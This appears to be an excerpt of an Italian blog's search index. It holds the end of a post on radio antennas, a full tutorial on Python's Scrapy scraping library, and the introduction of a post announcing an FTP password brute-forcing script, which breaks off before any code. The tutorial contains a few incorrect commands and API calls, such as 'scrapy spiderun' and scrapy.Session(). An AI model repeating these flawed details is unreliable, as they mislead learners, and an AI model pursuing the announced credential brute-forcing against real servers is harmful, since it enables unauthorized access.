cioÃ¨ dalla deviazione del segnale radio quando incontra ostacoli come angoli, spigoli o superfici curve.\nIl fading puÃ² anche essere causato dall\u0026rsquo;assorbimento delle onde radio da parte di materiali come acqua, pioggia, neve o aria umida. In questo caso, la quantitÃ  di energia del segnale radio diminuisce man mano che attraversa questi materiali, causando un attenuamento del segnale.\nIl fading puÃ² essere ridotto utilizzando tecniche come l\u0026rsquo;uso di antenne direzionali, la diversitÃ  di antenna e la modulazione adattiva, che possono aiutare a migliorare la qualitÃ  del segnale radio e ridurre la perdita di intensitÃ .\n","date":null,"permalink":"https://kobra3390.github.io/SpaceHack/posts/appunti-sulle-antenne/antenne/","tags":["Telecomunicazioni","Antenne","Elettronica"],"title":"Appunti sulle Antenne"},{"categories":["Tutorial"],"contents":" Table Of Contents:\n Introduzione al modulo Esempi Pratici  Estrazione del titolo di una pagina web Estrazione dei prezzi dei libri da una pagina web Estrazione di tutte le informazioni sui libri da una pagina web Estrazione di tutte le informazioni sui libri da piÃ¹ pagine web Estrazione di informazioni sui libri da una pagina web utilizzando un\u0026rsquo;espressione regolare Estrazione di informazioni sui libri da una pagina web e salvataggio in formato CSV Scraping di dati da piÃ¹ siti Scraping di dati da una pagina con autenticazione Scraping di dati da una pagina AJAX Scraping di dati da una pagina utilizzando una sessione Scraping di tutti i prezzi dei libri su tutte le pagine Scraping di tutti i titoli e le categorie dei libri Scraping delle immagini dei libri Scraping dei prezzi dei libri in un formato specifico (es. JSON)     Introduzione al modulo Scrapy Ã¨ un modulo Python open-source per il web scraping. Ãˆ stato progettato per estrarre i dati da siti web in modo efficiente e rapido. Scrapy offre una serie di funzionalitÃ  avanzate per il web scraping, tra cui la gestione delle richieste, la navigazione del sito, la selezione dei dati tramite XPath o CSS selector e la gestione dei cookie.\nIl modulo Scrapy utilizza una struttura ad albero per rappresentare il contenuto di una pagina web. CiÃ² consente agli sviluppatori di selezionare facilmente i dati desiderati utilizzando i selettori CSS e XPath. Inoltre, Scrapy fornisce una serie di metodi per navigare il sito web come segue: seguire i link, inviare form e gestire i cookie.\nScrapy Ã¨ anche progettato per essere utilizzato in modo scalabile, Ã¨ in grado di gestire grandi quantitÃ  di dati e di supportare il parallelismo. Il modulo supporta anche la persistenza dei dati, consentendo di salvare i dati estratti in un formato specifico, come CSV, JSON o XML.\nPer creare un progetto con Scrapy, Ã¨ necessario creare un nuovo progetto utilizzando il comando scrapy startproject, quindi creare un nuovo spider utilizzando il comando scrapy genspider. In seguito si definiscono le regole di scraping nella funzione parse() del proprio spider.\nIn sintesi Scrapy Ã¨ uno strumento molto potente per estrarre i dati dal web, grazie alla sua flessibilitÃ  e alle sue funzionalitÃ  avanzate, Ã¨ possibile creare spider in grado di estrarre dati da siti web complessi e navigare attraverso piÃ¹ pagine.\n Disclaimer: âš ï¸ Il web scraping Ã¨ una pratica legale a meno che non violi le condizioni d\u0026rsquo;uso del sito web in questione. Il presente software Ã¨ stato creato per scopi educativi e di ricerca e non deve essere utilizzato per violare le leggi o i termini d\u0026rsquo;uso di un sito web. L\u0026rsquo;utente Ã¨ responsabile dell\u0026rsquo;utilizzo del software e degli eventuali danni causati dall\u0026rsquo;utilizzo improprio. âš ï¸\n Per installare e configurare uno progetto con il modulo scrapy possiamo usare i seguenti step:\nInstallare Scrapy: Ã¨ possibile farlo utilizzando il comando seguente nella riga di comando:\npip install scrapy Oppure per Python3:\npip3 install scrapy Creare un nuovo progetto: Per creare un progetto Ã¨ possibile utilizzare il comando nella riga di comando:\nscrapy startproject \u0026lt;nome_progetto\u0026gt; Dove \u0026lt;nome_progetto\u0026gt; Ã¨ il nome del progetto che si desidera creare. Questo comando creerÃ  una nuova cartella con il nome del progetto, che conterrÃ  i file di configurazione e la struttura del progetto.\nCreare un nuovo spider: utilizzare il comando seguente nella riga di comando:\nscrapy genspider \u0026lt;nome_spider\u0026gt; \u0026lt;dominio\u0026gt; Dove \u0026lt;nome_spider\u0026gt; Ã¨ il nome del spider che si desidera creare e  Ã¨ il dominio del sito web da cui si desidera estrarre i dati. Questo comando creerÃ  un nuovo file spider nella cartella \u0026ldquo;spiders\u0026rdquo; del progetto. Il comando richiede il nome dello spider e l\u0026rsquo;URL di partenza per lo spider. Esempio:\nscrapy genspider example example.com Questo creerÃ  un file chiamato example.py all\u0026rsquo;interno della cartella spiders del tuo progetto, con una classe di spider chiamata ExampleSpider che inizia a estrarre i dati dall\u0026rsquo;URL example.com.\nUna volta creato lo spider, Ã¨ possibile modificare il codice per soddisfare le esigenze del progetto. In seguito, lo spider puÃ² essere eseguito utilizzando il comando:\nscrapy spiderun \u0026lt;nome_spider\u0026gt;.py Extra: ExampleSpider Ã¨ il nome della classe dello spider generato automaticamente dal comando scrapy genspider con il nome che gli hai dato quando hai creato lo spider.\nLa classe estende la classe base scrapy.Spider e include una serie di proprietÃ  e metodi predefiniti che puoi utilizzare per configurare e eseguire lo spider.\nPer esempio, nella classe Ã¨ presente il nome dello spider name e gli url di partenza start_urls che specificano l\u0026rsquo;indirizzo web a cui si vuole fare scraping, la funzione di callback parse() che viene chiamata quando lo spider recupera una pagina web.\nL\u0026rsquo;idea Ã¨ che tu possa modificare questa classe e adattarlo alle tue esigenze specifiche, aggiungendo eventuali selettori CSS o XPath, gestione dei cookies, trattamento dei dati, ecc.\nModificare il codice del spider: aprire il file spider appena creato e modificare il codice per adattarlo alle esigenze del progetto. Ãˆ possibile utilizzare il metodo start_requests() per specificare la URL iniziale da cui iniziare a estrarre i dati, il metodo parse() per specificare come estrarre i dati dalle pagine web, e il metodo parse_item() per specificare come estrarre i dati da un singolo elemento della pagina web.\nEseguire lo spider: Come citato in precedenza Ã¨ possibile utilizzare il comando seguente nella riga di comando per eseguire lo spider:\nscrapy spiderun \u0026lt;nome_spider\u0026gt;.py Dove \u0026lt;nome_spider\u0026gt; Ã¨ il nome del spider creato in precedenza. In questo modo, verranno stampati i dati estratti nella console o salvati in un file, a seconda delle impostazioni specificate nel codice. Per eseguire lo spider bisogna trovarsi nella directory spiders.\nRicordati che Ã¨ possibile utilizzare anche il comando\nscrapy shell \u0026lt;url\u0026gt; Questo per testare il codice del tuo spider su una singola pagina web, prima di lanciare la scansione sull\u0026rsquo;intero sito.\nDi seguito vediamo degli esempi usando come URL: http://books.toscrape.com/ che viene usato appositamente per il Web Scraping.\nNota: durante lâ€™esecuzione del codice possono esserci errori per la mancanza del modulo attrs, per installarlo usiamo il comando:\npip install attrs Oppure per Python3:\npip3 install attrs Se abbiamo giÃ  questo modulo, possiamo aggiornarlo con il comando:\npip install --upgrade attrs Esempi Pratici Estrazione del titolo di una pagina web import scrapy class TitleSpider(scrapy.Spider): name = \u0026#34;titlespider\u0026#34; start_urls = [ \u0026#34;http://books.toscrape.com/catalogue/category/books/science_22/index.html\u0026#34;, ] def parse(self, response): for book in response.css(\u0026#34;article.product_pod\u0026#34;): yield { \u0026#34;title\u0026#34;: book.css(\u0026#34;h3 \u0026gt; a::text\u0026#34;).get(), } Questo codice crea uno spider chiamato TitleSpider che estende la classe base scrapy.Spider. Nella classe, viene definito un nome per lo spider e una lista di URL di partenza per lo spider. Nel nostro caso, l\u0026rsquo;URL di partenza Ã¨ una pagina web di un negozio di libri online.\nLa funzione parse() Ã¨ chiamata ogni volta che lo spider recupera una pagina web. All\u0026rsquo;interno della funzione parse(), utilizziamo un ciclo for per scorrere tutti gli elementi HTML che corrispondono al selettore article.product_pod. Questo selettore seleziona tutti gli elementi  con la classe product_pod nella pagina web.\nPer ogni elemento selezionato, utilizziamo il selettore h3 \u0026gt; a::text per selezionare il testo del primo elemento  all\u0026rsquo;interno dell\u0026rsquo;elemento  all\u0026rsquo;interno dell\u0026rsquo;elemento . Il testo selezionato rappresenta il titolo del libro. Utilizziamo la funzione get() per restituire il valore del titolo del libro come una stringa. Infine, utilizziamo yield per restituire un dizionario contenente il titolo del libro. Alla fine del ciclo for, lo spider avrÃ  raccolto tutti i titoli dei libri presenti nella pagina web di partenza.\nEstrazione dei prezzi dei libri da una pagina web import scrapy class PriceSpider(scrapy.Spider): name = \u0026#34;pricespider\u0026#34; start_urls = [ \u0026#34;http://books.toscrape.com/catalogue/category/books/science_22/index.html\u0026#34;, ] def parse(self, response): for book in response.css(\u0026#34;article.product_pod\u0026#34;): yield { \u0026#34;price\u0026#34;: book.css(\u0026#34;.price_color::text\u0026#34;).get(), } Questo codice Ã¨ un esempio di uno spider di Scrapy che estrae i prezzi dei libri da una pagina web specifica.\nLa classe PriceSpider estende la classe base scrapy.Spider e include alcune proprietÃ  e metodi specifici per questo spider.\n La proprietÃ  name assegna un nome allo spider, in questo caso \u0026ldquo;pricespiderâ€ La proprietÃ  start_urls specifica gli URL di partenza per lo spider, in questo caso l\u0026rsquo;indirizzo \u0026ldquo;http://books.toscrape.com/catalogue/category/books/science_22/index.html\u0026rdquo;  La funzione parse() Ã¨ il metodo di callback chiamato quando lo spider recupera una pagina web, questa funzione Ã¨ responsabile di estrarre i dati dalla pagina.\nLa funzione utilizza un ciclo for per ciclare attraverso ogni elemento HTML con classe article.product_pod, questi elementi rappresentano ogni libro presente sulla pagina.\nPer ogni libro, utilizza il selettore CSS .price_color per individuare il prezzo del libro, e utilizza il metodo get() per recuperare il testo del prezzo. Il prezzo estratto viene quindi aggiunto ad un dizionario come valore della chiave \u0026ldquo;price\u0026rdquo; e restituito attraverso l\u0026rsquo;istruzione yield.\nIn sintesi, questo spider recupera la pagina web specificata, estrae i prezzi di ogni libro presente sulla pagina e li restituisce come una serie di dizionari, dove ogni dizionario rappresenta un libro e contiene solo una chiave price con il relativo prezzo del libro.\nEstrazione di tutte le informazioni sui libri da una pagina web import scrapy class BookSpider(scrapy.Spider): name = \u0026#34;bookspider\u0026#34; start_urls = [ \u0026#34;http://books.toscrape.com/catalogue/category/books/science_22/index.html\u0026#34;, ] def parse(self, response): for book in response.css(\u0026#34;article.product_pod\u0026#34;): yield { \u0026#34;title\u0026#34;: book.css(\u0026#34;h3 \u0026gt; a::text\u0026#34;).get(), \u0026#34;price\u0026#34;: book.css(\u0026#34;.price_color::text\u0026#34;).get(), \u0026#34;rating\u0026#34;: book.css(\u0026#34;.star-rating::attr(class)\u0026#34;).get().split(\u0026#34; \u0026#34;)[-1], } Questo codice mostra come creare uno spider chiamato \u0026ldquo;bookspider\u0026rdquo; utilizzando il modulo Scrapy in Python. Lo spider inizia a navigare nell\u0026rsquo;indirizzo web specificato in \u0026ldquo;start_urls\u0026rdquo;, che in questo caso Ã¨ \u0026ldquo;http://books.toscrape.com/catalogue/category/books/science_22/index.html\u0026quot;.\nLa funzione parse() viene chiamata per ogni pagina visitata dallo spider e consente di analizzare il contenuto della pagina. In questo esempio, la funzione parse() utilizza il metodo \u0026ldquo;css\u0026rdquo; per selezionare tutti gli elementi HTML con la classe \u0026ldquo;product_pod\u0026rdquo; e li itera uno per uno.\nPer ogni elemento, vengono estratte tre informazioni:\n Il titolo del libro utilizzando il selettore \u0026ldquo;h3 \u0026gt; a::text\u0026rdquo;, che seleziona il testo all\u0026rsquo;interno del tag \u0026ldquo;a\u0026rdquo; immediatamente figlio del tag \u0026ldquo;h3\u0026rdquo; all\u0026rsquo;interno dell\u0026rsquo;elemento \u0026ldquo;articleâ€ Il prezzo utilizzando il selettore \u0026ldquo;.price_color::text\u0026rdquo;, che seleziona il testo all\u0026rsquo;interno del tag con classe \u0026ldquo;price_color\u0026rdquo; all\u0026rsquo;interno dell\u0026rsquo;elemento \u0026ldquo;articleâ€ La valutazione utilizzando il selettore \u0026ldquo;.star-rating::attr(class)\u0026rdquo;, che seleziona il valore dell\u0026rsquo;attributo \u0026ldquo;class\u0026rdquo; del tag con classe \u0026ldquo;star-rating\u0026rdquo; all\u0026rsquo;interno dell\u0026rsquo;elemento \u0026ldquo;article\u0026rdquo;. Poi si utilizza il metodo \u0026ldquo;split\u0026rdquo; per dividere la stringa in una lista di stringhe, e si prende l\u0026rsquo;ultima parte della stringa cioÃ¨ l\u0026rsquo;ultimo elemento della lista.  Tutte queste informazioni vengono quindi restituite come un dizionario utilizzando il comando \u0026ldquo;yield\u0026rdquo; all\u0026rsquo;interno del ciclo for.\nEstrazione di tutte le informazioni sui libri da piÃ¹ pagine web import scrapy class MultiPageBookSpider(scrapy.Spider): name = \u0026#34;multipagebookspider\u0026#34; start_urls = [ \u0026#34;http://books.toscrape.com/catalogue/category/books/science_22/index.html\u0026#34;, ] def parse(self, response): for book in response.css(\u0026#34;article.product_pod\u0026#34;): yield { \u0026#34;title\u0026#34;: book.css(\u0026#34;h3 \u0026gt; a::text\u0026#34;).get(), \u0026#34;price\u0026#34;: book.css(\u0026#34;.price_color::text\u0026#34;).get(), \u0026#34;rating\u0026#34;: book.css(\u0026#34;.star-rating::attr(class)\u0026#34;).get().split(\u0026#34; \u0026#34;)[-1], } next_page = response.css(\u0026#34;li.next \u0026gt; a::attr(href)\u0026#34;).get() if next_page is not None: yield response.follow(next_page, self.parse) Questo codice Ã¨ un esempio di uno spider Scrapy che utilizza un ciclo for per estrarre informazioni da piÃ¹ pagine di un sito web.\nIl nome dello spider Ã¨ multipagebookspider e la pagina iniziale da cui inizia la scansione Ã¨ \u0026ldquo;http://books.toscrape.com/catalogue/category/books/science_22/index.html\u0026quot;.\nLa funzione parse Ã¨ chiamata per ogni pagina e utilizza il metodo css per estrarre informazioni sui libri dalla pagina (titolo, prezzo e valutazione).\nSuccessivamente, utilizza il metodo css per estrarre il link alla prossima pagina e utilizza il metodo response.follow per seguire il link e chiamare nuovamente la funzione parse per la pagina successiva. CiÃ² consente allo spider di continuare a estrarre informazioni dalle pagine successive finchÃ© non viene raggiunta la fine del sito.\nEstrazione di informazioni sui libri da una pagina web utilizzando un\u0026rsquo;espressione regolare import scrapy import re class RegexBookSpider(scrapy.Spider): name = \u0026#34;regexbookspider\u0026#34; start_urls = [ \u0026#34;http://books.toscrape.com/catalogue/category/books/science_22/index.html\u0026#34;, ] def parse(self, response): for book in response.css(\u0026#34;article.product_pod\u0026#34;): title = book.css(\u0026#34;h3 \u0026gt; a::text\u0026#34;).get() price = book.css(\u0026#34;.price_color::text\u0026#34;).get() rating = book.css(\u0026#34;.star-rating::attr(class)\u0026#34;).get() availability = book.css(\u0026#34;p.availability::text\u0026#34;).get() match = re.search(r\u0026#39;\\d+\u0026#39;, availability) if match: stock = int(match.group(0)) yield { \u0026#34;title\u0026#34;: title, \u0026#34;price\u0026#34;: price, \u0026#34;rating\u0026#34;: rating, \u0026#34;stock\u0026#34;: stock } Questo Ã¨ un esempio di codice scritto in Python utilizzando la libreria Scrapy per creare un spider chiamato RegexBookSpider.\nIn particolare, questo spider Ã¨ impostato per iniziare la navigazione nella pagina \u0026ldquo;http://books.toscrape.com/catalogue/category/books/science_22/index.html\u0026quot; e utilizza l\u0026rsquo;espressione regolare (regex) per estrarre informazioni sul numero di copie disponibili di ciascun libro.\nIl metodo parse Ã¨ chiamato per ogni pagina visitata dallo spider e utilizza il selettore CSS per selezionare i dati di interesse nella pagina. In questo caso, il spider estrae il titolo, il prezzo, la valutazione e la disponibilitÃ  di ogni libro. L\u0026rsquo;espressione regolare re.search(r'\\d+', availability) Ã¨ utilizzata per cercare una corrispondenza di un numero intero all\u0026rsquo;interno della stringa di disponibilitÃ . Se una corrispondenza viene trovata, il numero di stock disponibili viene salvato in una variabile chiamata \u0026ldquo;stock\u0026rdquo;. Infine, le informazioni estratte vengono restituite come un dizionario.\nEstrazione di informazioni sui libri da una pagina web e salvataggio in formato CSV import scrapy class BookSpiderCSV(scrapy.Spider): name = \u0026#34;bookspidercsv\u0026#34; start_urls = [ \u0026#34;http://books.toscrape.com/catalogue/category/books/science_22/index.html\u0026#34;, ] custom_settings = { \u0026#34;FEED_FORMAT\u0026#34;: \u0026#34;csv\u0026#34;, \u0026#34;FEED_URI\u0026#34;: \u0026#34;books.csv\u0026#34;, } def parse(self, response): for book in response.css(\u0026#34;article.product_pod\u0026#34;): yield { \u0026#34;title\u0026#34;: book.css(\u0026#34;h3 \u0026gt; a::text\u0026#34;).get(), \u0026#34;price\u0026#34;: book.css(\u0026#34;.price_color::text\u0026#34;).get(), \u0026#34;rating\u0026#34;: book.css(\u0026#34;.star-rating::attr(class)\u0026#34;).get().split(\u0026#34; \u0026#34;)[-1], } Questo codice Ã¨ un esempio di uno spider Scrapy che raccoglie informazioni sui libri presenti su un sito web di esempio \u0026ldquo;http://books.toscrape.com/catalogue/category/books/science_22/index.html\u0026quot; e le salva in un file CSV. Il nome dello spider Ã¨ \u0026ldquo;bookspidercsv\u0026rdquo; e la classe principale Ã¨ BookSpiderCSV che estende la classe base scrapy.Spider.\nLa proprietÃ  start_urls specifica l\u0026rsquo;URL iniziale del sito web da cui lo spider inizierÃ  a raccogliere i dati.\nLa funzione parse viene eseguita per ogni pagina del sito web raccolta dallo spider. In questo caso, utilizza il metodo response.css per selezionare tutti gli elementi HTML con la classe product_pod dalla pagina, che rappresentano i libri. Per ogni libro, raccoglie il titolo, il prezzo e la valutazione utilizzando il metodo \u0026ldquo;css\u0026rdquo; e salva i dati raccolti in un dizionario.\nLa proprietÃ  custom_settings imposta il formato del file di output e il nome del file di output. In questo caso, il formato Ã¨ impostato su csv e il nome del file su books.csv.\nAlla fine, tutti i dati raccolti dalla funzione parse vengono scritti nel file CSV books.csv nella cartella radice del progetto.\nScraping di dati da piÃ¹ siti import scrapy class MultiSiteBookSpider(scrapy.Spider): name = \u0026#34;multisitebookspider\u0026#34; start_urls = [\u0026#34;http://books.toscrape.com/catalogue/category/books/science_22/index.html\u0026#34;, \u0026#34;http://books.toscrape.com/catalogue/category/books/science_23/index.html\u0026#34;] def parse(self, response): for book in response.css(\u0026#34;article.product_pod\u0026#34;): yield { \u0026#34;title\u0026#34;: book.css(\u0026#34;h3 a::attr(title)\u0026#34;).get(), \u0026#34;price\u0026#34;: book.css(\u0026#34;p.price_color::text\u0026#34;).get() } In questo esempio, lo spider utilizza un elenco di URL di partenza start_urls che contiene piÃ¹ di un sito web. Utilizzando un solo metodo parse() per estrarre i dati, lo spider esegue la scansione di entrambi i siti web specificati nel elenco e estrae i dati dei libri dalle pagine web.\nScraping di dati da una pagina con autenticazione import scrapy from scrapy.http import FormRequest class MySpider(scrapy.Spider): name = \u0026#34;myspider\u0026#34; start_urls = [ \u0026#34;https://mywebsite.com/login\u0026#34;, ] def parse(self, response): # estraiamo il token CSRF dalla pagina di login csrf_token = response.css(\u0026#34;input[name=\u0026#39;csrf_token\u0026#39;]::attr(value)\u0026#34;).get() # creiamo una richiesta di form con i dati di login e il token CSRF yield FormRequest.from_response(response, formdata={ \u0026#34;username\u0026#34;: \u0026#34;myusername\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;mypassword\u0026#34;, \u0026#34;csrf_token\u0026#34;: csrf_token }, callback=self.after_login) def after_login(self, response): # controlliamo se siamo stati autenticati con successo if \u0026#34;Incorrect username or password\u0026#34; in response.body: self.logger.error(\u0026#34;Login fallito\u0026#34;) return # se siamo stati autenticati con successo, possiamo iniziare a fare scraping for item in response.css(\u0026#34;div.item\u0026#34;): yield { \u0026#34;title\u0026#34;: item.css(\u0026#34;h3 \u0026gt; a::text\u0026#34;).get(), \u0026#34;price\u0026#34;: item.css(\u0026#34;span.price::text\u0026#34;).get(), \u0026#34;image_url\u0026#34;: item.css(\u0026#34;img::attr(src)\u0026#34;).get() } # e possiamo anche seguire i link per le pagine successive next_page = response.css(\u0026#34;a.next_page::attr(href)\u0026#34;).get() if next_page is not None: yield response.follow(next_page, self.after_login) In questo modo, il spider inizia visitando la pagina di login, estrae il token CSRF e invia una richiesta di form con i dati di login e il token. Quindi, utilizza la funzione after_login come callback per gestire la risposta della richiesta di form. In questa funzione, il spider controlla se l\u0026rsquo;autenticazione Ã¨ stata eseguita con successo e, in caso contrario, registra un errore. In caso contrario, il spider inizia a fare scraping dei dati e a seguire i link per le pagine successive.\nScraping di dati da una pagina AJAX import scrapy class AJAXBookSpider(scrapy.Spider): name = \u0026#34;ajaxbookspider\u0026#34; start_urls = [\u0026#34;http://books.toscrape.com/catalogue/category/books/ajax\u0026#34;] def parse(self, response): # Invia una richiesta POST per ottenere i dati dei libri tramite AJAX yield scrapy.FormRequest( \u0026#34;http://books.toscrape.com/catalogue/category/books/ajax\u0026#34;, formdata={\u0026#34;page\u0026#34;: \u0026#34;2\u0026#34;}, callback=self.parse_ajax_response ) def parse_ajax_response(self, response): # Estraiamo i dati dei libri dalla risposta AJAX for book in response.css(\u0026#34;article.product_pod\u0026#34;): yield { \u0026#34;title\u0026#34;: book.css(\u0026#34;h3 a::attr(title)\u0026#34;).get(), \u0026#34;price\u0026#34;: book.css(\u0026#34;p.price_color::text\u0026#34;).get() } In questo esempio, lo spider utilizza il metodo scrapy.FormRequest() per inviare una richiesta POST con i dati del form AJAX alla pagina web. La risposta AJAX contiene i dati dei libri che vengono estratti dalla pagina utilizzando il metodo parse_ajax_response().\nScraping di dati da una pagina utilizzando una sessione import scrapy class SessionBookSpider(scrapy.Spider): name = \u0026#34;sessionbookspider\u0026#34; start_urls = [\u0026#34;http://books.toscrape.com/catalogue/category/books/science_22/index.html\u0026#34;] def start_requests(self): # Iniziamo una sessione self.session = scrapy.Session() # Effettuiamo il login return [self.session.post(\u0026#34;http://books.toscrape.com/login\u0026#34;, data={\u0026#34;username\u0026#34;: \u0026#34;user\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;pass\u0026#34;})] def parse(self, response): for book in response.css(\u0026#34;article.product_pod\u0026#34;): yield { \u0026#34;title\u0026#34;: book.css(\u0026#34;h3 a::attr(title)\u0026#34;).get(), \u0026#34;price\u0026#34;: book.css(\u0026#34;p.price_color::text\u0026#34;).get() } In questo esempio, lo spider utilizza una sessione per effettuare il login alla pagina web prima di iniziare a estrarre i dati. Utilizzando il metodo start_requests() per effettuare il login e il metodo parse() per estrarre i dati, lo spider mantiene la sessione attiva durante tutto il processo di scraping.\nScraping di tutti i prezzi dei libri su tutte le pagine import scrapy class AllPricesSpider(scrapy.Spider): name = \u0026#34;allpricesspider\u0026#34; start_urls = [ \u0026#34;http://books.toscrape.com/catalogue/category/books/science_22/index.html\u0026#34;, ] def parse(self, response): for book in response.css(\u0026#34;article.product_pod\u0026#34;): yield { \u0026#34;price\u0026#34;: book.css(\u0026#34;.price_color::text\u0026#34;).get(), } next_page = response.css(\u0026#34;li.next \u0026gt; a::attr(href)\u0026#34;).get() if next_page is not None: yield response.follow(next_page, self.parse) Questo codice Ã¨ un esempio di uno spider Scrapy che estrae i prezzi di tutti i libri presenti sul sito \u0026ldquo;http://books.toscrape.com/catalogue/category/books/science_22/index.html\u0026quot; e li salva in un formato predefinito.\nIl codice importa la libreria di scrapy, quindi definisce una classe AllPricesSpider che estende la classe base scrapy.Spider.\nLa classe ha un nome univoco name e una lista di URL da cui iniziare a raccogliere i dati start_urls.\nIl metodo parse Ã¨ chiamato per ogni pagina visitata e utilizza la funzione response.css per selezionare tutti gli elementi article.product_pod sulla pagina. Per ogni elemento selezionato, estrae il prezzo utilizzando la selezione .price_color::text e lo salva in un dizionario.\nInfine, il codice cerca il link per la pagina successiva, se esiste, utilizzando la funzione \u0026ldquo;response.css(\u0026ldquo;li.next \u0026gt; a::attr(href)\u0026quot;).get()\u0026rdquo; e segue il link utilizzando la funzione \u0026ldquo;response.follow(next_page, self.parse)\u0026rdquo; per continuare a raccogliere dati dalle successive pagine.\nScraping di tutti i titoli e le categorie dei libri import scrapy class TitleCategorySpider(scrapy.Spider): name = \u0026#34;titlecategoryspider\u0026#34; start_urls = [ \u0026#34;http://books.toscrape.com/catalogue/category/books/science_22/index.html\u0026#34;, ] def parse(self, response): for book in response.css(\u0026#34;article.product_pod\u0026#34;): yield { \u0026#34;title\u0026#34;: book.css(\u0026#34;h3 \u0026gt; a::text\u0026#34;).get(), \u0026#34;category\u0026#34;: response.css(\u0026#34;nav \u0026gt; ul \u0026gt; li.active \u0026gt; a::text\u0026#34;).get(), } Questo codice utilizza la libreria scrapy per estrarre dati da una pagina web. In particolare, il codice crea una classe chiamata TitleCategorySpider che estrae i titoli dei libri e la categoria dei libri dalla pagina web \u0026ldquo;http://books.toscrape.com/catalogue/category/books/science_22/index.html\u0026quot;.\nLa classe TitleCategorySpider estende la classe scrapy.Spider e definisce un metodo parse che viene chiamato quando la pagina specificata in start_urls Ã¨ scaricata.\nIl metodo parse utilizza il metodo response.css per selezionare gli elementi delle pagine web. Utilizza il metodo css per selezionare gli elementi article.product_pod dalla pagina web. Per ogni elemento selezionato, utilizza il metodo css di nuovo per estrarre il titolo del libro (\u0026ldquo;h3 \u0026gt; a::text\u0026rdquo;) e la categoria del libro (\u0026ldquo;nav \u0026gt; ul \u0026gt; li.active \u0026gt; a::text\u0026rdquo;) e quindi li salva in un dizionario.\nIl metodo yield Ã¨ utilizzato per restituire il dizionario come risultato del metodo parse. In questo modo, scrapy sa che il risultato deve essere raccolto e utilizzato per qualcos\u0026rsquo;altro, come la scrittura su un file o la memorizzazione in un database.\nScraping delle immagini dei libri import scrapy class BookImageSpider(scrapy.Spider): name = \u0026#34;bookimagespider\u0026#34; start_urls = [ \u0026#34;http://books.toscrape.com/catalogue/category/books/science_22/index.html\u0026#34;, ] def parse(self, response): for book in response.css(\u0026#34;article.product_pod\u0026#34;): yield { \u0026#34;title\u0026#34;: book.css(\u0026#34;h3 \u0026gt; a::text\u0026#34;).get(), \u0026#34;image_urls\u0026#34;: book.css(\u0026#34;img::attr(src)\u0026#34;).getall(), } Il codice utilizza la libreria scrapy per creare uno spider chiamato bookimagespider che inizia a navigare dalla pagina \u0026ldquo;http://books.toscrape.com/catalogue/category/books/science_22/index.html\u0026quot;.\nIl metodo parse(self, response) viene chiamato per ogni pagina visitata dallo spider. Il metodo cerca tutti gli elementi HTML con classe product_pod che rappresentano i libri nella pagina. Per ogni elemento trovato, estrae il titolo del libro e l\u0026rsquo;URL dell\u0026rsquo;immagine del libro.\nL\u0026rsquo;URL dell\u0026rsquo;immagine del libro viene estratto tramite il metodo .css(\u0026ldquo;img::attr(src)\u0026quot;).getall() che seleziona tutti gli elementi img e estrae l\u0026rsquo;attributo src. Il risultato Ã¨ una lista di URL delle immagini dei libri.\nQuesti dati estratti vengono quindi restituiti come un dizionario con le chiavi title e image_urls.\nScraping dei prezzi dei libri in un formato specifico (es. JSON) import scrapy class PriceSpiderJSON(scrapy.Spider): name = \u0026#34;pricespiderjson\u0026#34; start_urls = [ \u0026#34;http://books.toscrape.com/catalogue/category/books/science_22/index.html\u0026#34;, ] custom_settings = { \u0026#34;FEED_FORMAT\u0026#34;: \u0026#34;json\u0026#34;, \u0026#34;FEED_URI\u0026#34;: \u0026#34;prices.json\u0026#34;, } def parse(self, response): for book in response.css(\u0026#34;article.product_pod\u0026#34;): yield { \u0026#34;price\u0026#34;: book.css(\u0026#34;.price_color::text\u0026#34;).get(), } Questo codice utilizza la libreria scrapy per creare uno spider chiamato PriceSpiderJSON, che inizia a navigare nella pagina web \u0026ldquo;http://books.toscrape.com/catalogue/category/books/science_22/index.html\u0026quot; e recupera i prezzi dei libri presenti su quella pagina. Utilizza il metodo parse() per elaborare la risposta ottenuta dalla pagina web e recuperare i prezzi. Il metodo yield {} serve per generare un dizionario di output contenente la proprietÃ  \u0026ldquo;price\u0026rdquo; con il prezzo del libro.\nIl dizionario custom_settings definisce il formato del feed e il nome del file in cui verranno salvati i dati recuperati dallo spider. In questo caso il feed verrÃ  salvato in formato JSON con nome prices.json.\n","date":null,"permalink":"https://kobra3390.github.io/SpaceHack/posts/basi-sul-modulo-scrapy/basi_sul_modulo_scrapy/","tags":["Web Scraping","Python","Spider"],"title":"Basi sul Modulo Scrapy"},{"categories":["Tutorial","Network Attacks"],"contents":"Table Of Contents:\n Basi sul Protocollo FTP Configurazione di un Server FTP con Vsftpd Brute Forcing delle credenziali di un server FTP con Python Prova sul Campo   In questo post andrÃ² a spiegare come Ã¨ possibile creare uno script per fare il brute forcing delle credenziali (in particolare la password) di un server FTP. Prima di tutto facciamo chiarezza su cos\u0026rsquo;Ã¨ il protocollo FTP.\nBasi sul Protocollo FTP Ftp Ã¨ lâ€™acronimo di File Transfer Protocol esso Ã¨ un protocollo che permette di trasferire un file dalla rete al singolo client (server) e viceversa, esso perÃ² permette anche la navigazione veloce nella struttura di un server web dove sono presenti file. Ã‰ uno dei protocolli piÃ¹ vecchi di Internet. GiÃ  a partire dal 1974 si inizia a lavorare con la tecnologia di trasmissione dei file completi. Nel 1985 si definisce con esattezza il FTP nel documento Request For Comments 959. Il protocollo ftp Ã¨ un protocollo indipendente quindi Ã¨ possibile usarlo su qualsiasi computer, indipendentemente dal sistema operativo che vi si usa. Questo servizio viene usato anche nella posta odierna, questo perchÃ©, anche essendo un protocollo datato permette il trasferimento di file di notevoli dimensioni. Câ€™Ã¨ una distinzione da fare tra ftp pubblico e ftp privato:\n  ftp pubblico: viene definito tale quando un client esegue il download su un sito web, o su un qualsiasi sito che permette di scaricare file durante la navigazione in questo caso puÃ² essere chiamato anche anonymous ftp.\n  ftp privato: se ad esempio un provider mette a disposizione uno spazio web, directory comprese per fare il download e upload dei file html esso viene definito ftp privato o full service ftp.\n  Il File Transfer Protocol viene eseguito allâ€™interno del livello applicativo dello stack TCP/IP, ossia nello stesso livello di HTTP o POP. Questi protocolli si caratterizzano per il loro funzionamento in combinazione con i programmi, come browser o client di posta elettronica, grazie ai quali svolgono la propria funzione. Anche per il File Transfer Protocol esistono dei software FTP dedicati. Per stabilire una connessione FTP vengono aperti due canali. Per prima cosa client e server creano un canale di controllo tramite la porta 21, tramite il quale il client invia comandi al server e questo risponde con i codici di stato. DopodichÃ© entrambi possono creare un canale dati che trasporta i file desiderati da una 